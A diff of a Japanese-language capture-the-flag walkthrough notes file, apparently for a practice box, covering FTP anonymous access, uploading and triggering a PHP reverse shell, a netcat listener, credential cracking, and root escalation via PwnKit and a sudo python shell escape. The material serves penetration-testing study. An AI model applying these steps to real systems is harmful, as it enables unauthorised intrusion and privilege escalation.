@@ -5,24 +5,35 @@
 - ディレクトリ リスティング,hashes.comは使えない,crack station,pkexec,su,sudo-l(python)
 ### 課題
 - ftp,/tmpの両方にx64,x86のmsfvenomをおいたが、reverse-shellは失敗する
+
 ## 攻略(1)
 - nmap
   - ftpにanoymousで接続できるのがわかる
-- gobusterするとfilesというパスがあって、ブラウザで見るとディレクトリリスティングのサイトであることがわかる
-  - `gobuster dir -u $IP -w $dirsmall` 
+- gobuster
+  - `gobuster dir -u $IP -w $dirsmall`
+  - `files`というパスがあって、ブラウザで見るとディレクトリリスティングのサイトであることがわかる
 - ftpに接続する
   - `ftp $IP`
-  - 特に何もない 
-- ftpにphp-reverse-shell.phpを送る
+  - CALL.htmlというファイルがある。これは、さっき見たディレクトリリスティングの中が見れているのだとわかる
+- ftpからphp-reverse-shell.phpをシステムの内部に送ることでreverse-shellをすることができるんではないかと考える
+  - php-reverse-shell.phpを探す
+  - `locate php-reverse-shell.php | grep webshells` パスをcopyしておく
+  -  `cat ペースト > php-reverse-shell.php`
+    - よく使うので自分のhomeのtoolsフォルダの中に入れておく  
+  -  vimでopenしてipをParrotのアドレスに書き換える。portは書いてあるので覚えておく
   - ftpに接続後`put php-reverse-shell.php` 
-- ディレクトリリスティングのサイトからreverse-shellを実行する
+- Parrotで新しいターミナルで待ち受ける
+  - `nc -nlvp ?` 
+- ディレクトリリスティングのサイトにさっきputしたreverse-shellがあるので実行する
 - 対話型シェルにする
+  - pythonは2または3どっちか? 
 - `important.txt`がある
   - `/.runme.sh`にパスワードとユーザ名がわかる。
 - crack stationからonionがわかる
 - `su shrek`
 - SUID
-  - pkexecにgccもあるのでたぶん使える
+  - pkexecにgccもあるので使える
+  - PwnKit使える
   - それ以外は使えそうにない
 - `sudo -l`
 - `sudo python3.5 -c 'import os; os.system("/bin/bash")'`  
@@ -51,8 +62,10 @@ run
 ## 参考
 - Proftpdの設定ファイルを探す方法
   - `proftpd -V` 
-  - 実際にある場所
-  - `/usr/local/etc/proftpd.conf` 
+- 実際にある場所
+  - `/usr/local/etc/proftpd.conf`
+  - ファイルの下の方で、そこで設定してある
+    - `<Anonymous /var/www/html/files/>`
 
 ```
 # This is a basic ProFTPD configuration file (rename it to 
